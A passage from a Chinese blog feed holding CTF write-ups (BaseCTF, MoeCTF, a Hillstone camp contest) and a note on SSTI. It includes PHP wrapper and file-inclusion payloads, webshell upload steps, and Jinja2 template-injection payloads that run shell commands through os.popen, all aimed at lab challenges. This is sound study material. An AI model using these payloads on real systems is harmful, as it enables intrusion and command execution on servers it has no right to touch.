class="string">&#x27;bro 1&#x27;</span>:</span><br><span class="line">    abort(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() != <span class="string">&#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;</span>:</span><br><span class="line">    abort(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;🎉 You are right!&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> this</span><br></pre></td></tr></table></figure><p>进行代码分析一步一步来肯定能做出来，但是非常费时间，过程就不写了，反正太费时间了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185450874.png" alt="image-20240815185450874"></p><h4 id="Week1-倒计时？海报！"><a href="#Week1-倒计时？海报！" class="headerlink" title="[Week1] 倒计时？海报！"></a>[Week1] 倒计时？海报！</h4><p>考点：图片隐写</p><p>群里的海报，有十张，每张都潜藏flag的一部分，需要使用ps或者其他调色软件进行调色后寻找（眼睛都要找废了）大概就是像下面的图一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816200115184.png" alt="image-20240816200115184"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816200811716.png" alt="image-20240816200811716"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816201411434.png" alt="image-20240816201411434"></p><p>找齐后按10-1的顺序拼接在一起就是flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816201823427.png" alt="image-20240816201823427"></p><h4 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h4><p>考点：图片隐写，压缩包伪加密</p><p>打开文件，进行解压缩，发现一个png图片和一个压缩包。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222450635.png" alt="image-20240816222450635"></p><p>解压需要密码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222541447.png" alt="image-20240816222541447"></p><p>我刚开始觉得是伪加密，放进010editor查看了一下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223911247.png" alt="image-20240816223911247"></p><p>表面上看确实是，但根据后来题目提示发现，里面的另一个压缩包才是伪加密，这个是真有密码。（不知道为什么）</p><p>那就需要从图片入手。刚开始以为是高度，放进010editor里修改，发现没有用。</p><p>然后就用stegsolve打开，发现了信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222825621.png" alt="image-20240816222825621"></p><p>解码这段编码，得到提示</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222917433.png" alt="image-20240816222917433"></p><p>就是简单的LSB。找到key。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223022332.png" alt="image-20240816223022332"></p><p>解压过后得到里面的另一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223251279.png" alt="image-20240816223251279"></p><p>这个压缩包也需要密码，但是却是伪加密，放进010editor修改过后就能解压，拿到里面的flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223452392.png" alt="image-20240816223452392"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223545019.png" alt="image-20240816223545019"></p><p>这里的flag有两个，上面那个是假的，最后那个才是真的。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223627484.png" alt="image-20240816223627484"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223709957.png" alt="image-20240816223709957"></p><h4 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h4><p>考点：域名解析</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821155833385.png" alt="image-20240821155833385"></p><p>根据题目提示，进行域名解析，发现flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821155809814.png" alt="image-20240821155809814"></p><h4 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h4><p>考点：Audacity的使用</p><p>此解法非官方预期，需要官方解法请看官方wp。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821160008205.png" alt="image-20240821160008205"></p><p>直接人声分离，得到下图</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821165703923.png" alt="image-20240821165703923"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821170824565.png" alt="image-20240821170824565"></p><p>用摩斯密码解码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821171021708.png" alt="image-20240821171021708"></p><p>flag就是BaseCTF{FOLLOWYOURHEART}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h4><p>考点：http基础知识</p><p>打开容器，就是普通的http知识</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185636716.png" alt="image-20240815185636716"></p><p>按照提示抓包传入就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185817085.png" alt="image-20240815185817085"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185937091.png" alt="image-20240815185937091"></p><p>爆出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185954681.png" alt="image-20240815185954681"></p><p>解码得到。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815190030770.png" alt="image-20240815190030770"></p><h4 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•`"></a>[Week1] 喵喵喵´•ﻌ•`</h4><p>考点：eval()漏洞利用，指令利用</p><p>打开容器，是一个简单的传参利用eval()漏洞问题</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815190259501.png" alt="image-20240815190259501"></p><h4 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h4><p>考点：MD5绕过</p><p>打开容器，要求get传参name和name2，post传参password和password2。</p><p>分析代码，发现name和password的md5进行弱相等，直接用现成的例子。</p><p>name2和password2的md5值强相等，可以使用数组绕过。（具体看笔记）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815190644451.png" alt="image-20240815190644451"></p><h4 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h4><p>考点：查看源代码</p><p>打开容器是个小游戏，但是其实考点是查看源代码。不过这游戏还挺有意思的。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191053648.png" alt="image-20240815191053648"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191109940.png" alt="image-20240815191109940"></p><h4 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h4><p>考点：文件上传漏洞，一句话木马，webshell连接工具（蚁剑）</p><p>打开容器发现是文件上传。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191232696.png" alt="image-20240815191232696"></p><p>先进行准备，用记事本写上一句话木马，因为要上传图片文件，所以后缀改成.jpg</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191551084.png" alt="image-20240815191551084"></p><p>进行文件上传，用bp抓包，修改.jpg为.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191710890.png" alt="image-20240815191710890"></p><p>上传完了后找到该php文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191810966.png" alt="image-20240815191810966"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191827494.png" alt="image-20240815191827494"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191842431.png" alt="image-20240815191842431"></p><p>是空白是正常的，因为修改了后缀，不是jpg，是个损坏图片文件。只需要上面的路径，然后用蚁剑连接就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815192026311.png" alt="image-20240815192026311"></p><p>连接密码就是传参变量名。这里就是cmd</p><p>进入文件管理找到flag就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815192129003.png" alt="image-20240815192129003"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815192141082.png" alt="image-20240815192141082"></p><p>ps：这是在前端限制的情况下，简单，但是可能会有很多其他绕过，现在暂时没遇到，以后肯定会遇到。</p><h4 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h4><p>考点：代码审计，伪协议，SSRF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>);</span><br></pre></td></tr></table></figure><p>分析代码，有三个变量，全是post方法传参。</p><p>第一个需要使用data协议绕过file_get_concents()函数。构造payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pen</span>=data://text/plain<span class="comment">;base64,QXVyYQ==</span></span><br></pre></td></tr></table></figure><p>第二个就涉及到SSTR漏洞（见笔记）。构造payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">challenge</span>=http://jasmineaura.github.io@challenge.basectf.fun:<span class="number">34667</span></span><br></pre></td></tr></table></figure><p>第三个就是文件包含漏洞，需要filter协议绕过。构造payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gift=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817225236931.png" alt="image-20240817225236931"></p><p>解码得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817225312658.png" alt="image-20240817225312658"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moectf-week1-wp</title>
      <link href="/posts/177a214a.html"/>
      <url>/posts/177a214a.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>登录网站，是个签到的题，根据提示直接让luo缺勤，其他全补签就可以了。（我第一次的时候还专门给其他人缺勤了，真是个好老师了。）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810151950359.png" alt="image-20240810151950359"></p><h2 id="罗小黑战记"><a href="#罗小黑战记" class="headerlink" title="罗小黑战记"></a>罗小黑战记</h2><p>考点：动态图片</p><p>下载文件，是个116张图组成的动图，一帧一帧看，看到一个二维码，扫一扫出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152201508.png" alt="image-20240810152201508"></p><h2 id="杂项入门指北"><a href="#杂项入门指北" class="headerlink" title="杂项入门指北"></a>杂项入门指北</h2><p>考点：摩斯密码</p><p>这个下载后是群里的入门文件和海报，线索在海报上，仔细观察就能看到摩斯密码。（找了好久才看到）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152343047.png" alt="image-20240810152343047"></p><p><img src="C:\Users\胡广川\AppData\Roaming\Typora\typora-user-images\image-20240810152357028.png" alt="image-20240810152357028"></p><p>放进工具里解码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152505225.png" alt="image-20240810152505225"></p><p>不知道哪里出了点小问题，多了个‘T1’，要删除前面的，删后面的不行（恼火）</p><h2 id="ez-F5"><a href="#ez-F5" class="headerlink" title="ez-F5"></a>ez-F5</h2><p>考点：F5隐写</p><p>下载文件，是一个jpg文件，根据题目可知，应该是F5隐写工具。</p><p>在属性里找到备注信息</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240812184844735.png" alt="image-20240812184844735"></p><p>是base64，解码后得到no_password，盲猜是F5的密码。</p><p>使用工具拿到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240812184708960.png" alt="image-20240812184708960"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240812184612024.png" alt="image-20240812184612024"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h2><p>就用他给的文件搭建个环境，然后进网站就拿到flag。</p><h2 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h2><p>考点：爬虫管理</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152955144.png" alt="image-20240810152955144"></p><p>关键词“爬虫”，马上想到/robots.txt。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153043136.png" alt="image-20240810153043136"></p><p>访问出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153122557.png" alt="image-20240810153122557"></p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p>考点：http基础</p><p>考察http基础知识（不难但复杂）。打开网站，根据提示进行输入。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153501204.png" alt="image-20240810153501204"></p><p>先post,再get。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153400287.png" alt="image-20240810153400287"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153542605.png" alt="image-20240810153542605"></p><p>这里困了我半天（汗）。要修改source，先pb进行抓包，修改referer就行。</p><p>为了方便，直接在重放器里面进行了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153825556.png" alt="image-20240810153825556"></p><p>再是修改Cookie。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153913196.png" alt="image-20240810153913196"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153935693.png" alt="image-20240810153935693"></p><p>下一个是要修改浏览器，就是修改User-Agent。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154052149.png" alt="image-20240810154052149"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154117863.png" alt="image-20240810154117863"></p><p>然后是修改本地访问（幸好之前有笔记），在请求头里面添加 X-Forwarded-For:127.0.0.1 就可以了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154158461.png" alt="image-20240810154158461"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154233997.png" alt="image-20240810154233997"></p><p>拿到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154330859.png" alt="image-20240810154330859"></p><h2 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="headerlink" title="弗拉格之地的挑战"></a>弗拉格之地的挑战</h2><p>考点：http基础，查看源代码，控制台运行，上传木马，后台连接</p><p>打开网站，收集七颗龙珠。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173418160.png" alt="image-20240810173418160"></p><p>进入第一关，简单查看源代码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173447584.png" alt="image-20240810173447584"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173459995.png" alt="image-20240810173459995"></p><p>进入第二关。查看网络请求包，发现线索。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173551821.png" alt="image-20240810173551821"></p><p>进入第三关。先get,再post，再修改Cookie变成admin。（修改身份验证就是修改Cookie）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173729509.png" alt="image-20240810173729509"></p><p>进入第四关。这里耍了个把戏。从他的意思知道要修改来源source，抓包修改referer就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173856717.png" alt="image-20240810173856717"></p><p><img src="C:\Users\胡广川\AppData\Roaming\Typora\typora-user-images\image-20240810174008816.png" alt="image-20240810174008816"></p><p>正式进入第四关。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174108333.png" alt="image-20240810174108333"></p><p>这里点开始他怎么都是9。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174140720.png" alt="image-20240810174140720"></p><p>要想个法子，看源码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174225334.png" alt="image-20240810174225334"></p><p>直接在控制台重构这个函数，将button.id改成8，然后点8就过关了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174319507.png" alt="image-20240810174319507"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174418710.png" alt="image-20240810174418710"></p><p>这也提醒我前端的一切都可以更改。</p><p>接下来去第五关。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174506622.png" alt="image-20240810174506622"></p><p>先老实输入试试。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174550396.png" alt="image-20240810174550396"></p><p>emmmm…，好嘛，根据提示说前端不靠谱，估计又是要更改前端。找到控制函数修改。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174717389.png" alt="image-20240810174717389"></p><p>把false改成true就ok了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174807544.png" alt="image-20240810174807544"></p><p>进入第六关（终于快到了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174914705.png" alt="image-20240810174914705"></p><p>读代码，get一个，post一个，但基本都是用get的判断。大致意思就是不能匹配小写flag，但是必须匹配到flag，大小写都可以，所以只有大写传入了。</p><p>进入第七关（文件上传漏洞雏形，使用中国蚁剑）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810175150389.png" alt="image-20240810175150389"></p><p>第一反应，这不就是直接输入命令嘛，试试。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810175256329.png" alt="image-20240810175256329"></p><p>没看到什么有用的，直接找flag试试。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181009670.png" alt="image-20240810181009670"></p><p>本来能找到的，不知道为什么又找不到了（恼火）</p><p>用蚁剑算了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181114495.png" alt="image-20240810181114495"></p><p>网站就是当前网址，连接密码就是参数名。连上过后双击进去，然后找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181252784.png" alt="image-20240810181252784"></p><p>这里有个小彩蛋。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181318978.png" alt="image-20240810181318978"></p><p>说实话才看到还是挺大感触的。作为一个新手，靠自己一步一步的解出来题，成就感还是蛮大的。</p><p>最后将7个flag合在一起，解码，就得到flag了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181436782.png" alt="image-20240810181436782"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届山石ctf训练营结营（招新）赛wp</title>
      <link href="/posts/2a9a0bf1.html"/>
      <url>/posts/2a9a0bf1.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第四届山石ctf训练营结营（招新）赛wp"><a href="#第四届山石ctf训练营结营（招新）赛wp" class="headerlink" title="第四届山石ctf训练营结营（招新）赛wp"></a>第四届山石ctf训练营结营（招新）赛wp</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>根据提示关注公众号，发flag。</p><h2 id="play4fun"><a href="#play4fun" class="headerlink" title="play4fun"></a>play4fun</h2><p>下载压缩包后打开flag.txt文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171134109.png" alt="image-20240809171134109"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171201582.png" alt="image-20240809171201582"></p><p>是一串0和1的码，直接解码出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171340535.png" alt="image-20240809171340535"></p><h2 id="dog"><a href="#dog" class="headerlink" title="dog"></a>dog</h2><p>下载压缩包，解压发现是一条狗的图片。根据题目提示“狗狗的下巴呢?”</p><p>，猜测图片要修改高度，放进010editor里修改。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171556562.png" alt="image-20240809171556562"></p><p>最后看到图片里面的flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171631326.png" alt="image-20240809171631326"></p><h2 id="timestamp"><a href="#timestamp" class="headerlink" title="timestamp"></a>timestamp</h2><p>打开文件发现一个txt文件和压缩包，解压缩需要密码，使用要从txt文件入手。</p><p>仔细查看txt文件，发现是空白格隐藏，需要用到工具SNOW。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814162822412.png" alt="image-20240814162822412"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814162859033.png" alt="image-20240814162859033"></p><p>拿到密码后解压缩。</p><p>发现文件大小等全部一样，只有修改时间不一样，这就想到时间戳了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814163001102.png" alt="image-20240814163001102"></p><p>使用获取时间戳的代码获取时间戳，发现后三位不一样，提取后三位出来。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814163558008.png" alt="image-20240814163558008"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814164510267.png" alt="image-20240814164510267"></p><p>ascll码进行解码，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814164829973.png" alt="image-20240814164829973"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI漏洞</title>
      <link href="/posts/60e82712.html"/>
      <url>/posts/60e82712.html</url>
      
        <content type="html"><![CDATA[<p>SSTI漏洞：</p><p>超详细SSTI模板注入漏洞原理讲解_ssti注入-CSDN博客：<a href="https://blog.csdn.net/qq_61955196/article/details/132237648">https://blog.csdn.net/qq_61955196/article/details/132237648</a></p><p>焚靖工具安装:<a href="https://blog.csdn.net/m0_73683234/article/details/136789243">https://blog.csdn.net/m0_73683234/article/details/136789243</a></p><p>判断方法：</p><p>变量名=49   ＃如果正常回显，说明存在SSTI漏洞</p><p>python中的特殊属性：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c91f104c1ff705ad11a5a16052b6edc2.png" alt=""></p><p>常用的解题payload:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4076ea7b77cac94b078adab61bece939.png" alt=""></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">lipsum.__globals__.__builtins__.__import__</span>(<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;__buitlins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__init__.globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">*</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">*</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27; ` echo Y2F0IC9mKg== | base64 -d ` &#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>出现过滤，常用的绕过方法：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><p>绕过{}      %</p><p>绕过.        []</p><p>例子：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a33d47e40bdd2fe070a2ed06f4713b.png" alt=""></p><h2 id="详解："><a href="#详解：" class="headerlink" 